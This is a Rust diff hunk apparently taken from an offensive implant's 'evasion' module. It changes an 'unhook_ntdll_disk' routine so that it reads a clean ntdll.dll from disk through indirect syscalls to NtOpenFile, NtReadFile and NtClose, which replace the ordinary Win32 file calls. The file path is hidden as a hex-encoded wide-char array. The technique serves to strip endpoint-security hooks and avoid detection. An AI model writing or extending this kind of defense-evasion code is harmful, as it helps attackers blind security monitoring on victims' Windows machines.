@@ -12,26 +12,53 @@ unsafe fn resolve_ntdll_base() -> *mut u8 {
 }
 
 #[cfg(target_os = "windows")]
+#[repr(C)]
+struct IoStatusBlock { status: isize, information: usize }
+
+#[cfg(target_os = "windows")]
 pub unsafe fn unhook_ntdll_disk() -> bool {
-    use windows_sys::Win32::Storage::FileSystem::{
-        CreateFileA, ReadFile, OPEN_EXISTING, FILE_SHARE_READ, FILE_ATTRIBUTE_NORMAL,
-    };
-    use windows_sys::Win32::Foundation::{INVALID_HANDLE_VALUE, GENERIC_READ};
-    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
+    use crate::evasion::syscalls::{get_ssn, indirect_syscall, indirect_syscall_10};
 
     let ntdll_base = resolve_ntdll_base();
     if ntdll_base.is_null() { return false; }
 
-    let path = b"C:\\Windows\\System32\\ntdll.dll\0";
-    let h = CreateFileA(
-        path.as_ptr(), GENERIC_READ, FILE_SHARE_READ,
-        core::ptr::null(), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0,
-    );
-    if h == INVALID_HANDLE_VALUE { return false; }
+    // NT path as wide chars: \??\C:\Windows\System32\ntdll.dll
+    let nt_path: [u16; 36] = [
+        0x005C,0x003F,0x003F,0x005C,0x0043,0x003A,0x005C,0x0057,0x0069,0x006E,
+        0x0064,0x006F,0x0077,0x0073,0x005C,0x0053,0x0079,0x0073,0x0074,0x0065,
+        0x006D,0x0033,0x0032,0x005C,0x006E,0x0074,0x0064,0x006C,0x006C,0x002E,
+        0x0064,0x006C,0x006C,0,0,0,
+    ];
+    #[repr(C)]
+    struct UnicodeStr { length: u16, max_length: u16, _pad: u32, buf: *const u16 }
+    #[repr(C)]
+    struct ObjAttrs { length: u32, root_dir: usize, obj_name: *const UnicodeStr, attrs: u32, sec_desc: usize, sec_qos: usize }
+    let us = UnicodeStr { length: 66, max_length: 66, _pad: 0, buf: nt_path.as_ptr() };
+    let oa = ObjAttrs { length: core::mem::size_of::<ObjAttrs>() as u32, root_dir: 0, obj_name: &us, attrs: 0x40, sec_desc: 0, sec_qos: 0 };
+    let mut iosb = IoStatusBlock { status: 0, information: 0 };
+    let mut h: isize = 0;
+    let Some((ssn_open, tramp_open)) = get_ssn(b"NtOpenFile") else { return false; };
+    // FILE_READ_DATA|SYNCHRONIZE=0x00100001, ShareRead=1, FILE_SYNCHRONOUS_IO_NONALERT|FILE_NON_DIRECTORY_FILE=0x60
+    let status = indirect_syscall(ssn_open, tramp_open,
+        &mut h as *mut isize as usize, 0x00100001,
+        &oa as *const ObjAttrs as usize,
+        &mut iosb as *mut IoStatusBlock as usize,
+        1, 0x60);
+    if status < 0 || h == 0 { return false; }
 
     let mut buf = vec![0u8; 0x20_0000];
-    let mut bytes_read: u32 = 0;
-    ReadFile(h, buf.as_mut_ptr() as _, buf.len() as u32, &mut bytes_read, core::ptr::null_mut());
+    let mut rd_iosb = IoStatusBlock { status: 0, information: 0 };
+    let Some((ssn_read, tramp_read)) = get_ssn(b"NtReadFile") else {
+        if let Some((sc, tc)) = get_ssn(b"NtClose") { indirect_syscall(sc, tc, h as usize, 0,0,0,0,0); }
+        return false;
+    };
+    // NtReadFile: Handle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key
+    indirect_syscall_10(ssn_read, tramp_read,
+        h as usize, 0, 0, 0,
+        &mut rd_iosb as *mut IoStatusBlock as usize,
+        buf.as_mut_ptr() as usize,
+        buf.len() as usize,
+        0, 0, 0);
     if let Some((ssn_c, tramp_c)) = get_ssn(b"NtClose") {
         indirect_syscall(ssn_c, tramp_c, h as usize, 0, 0, 0, 0, 0);
     }
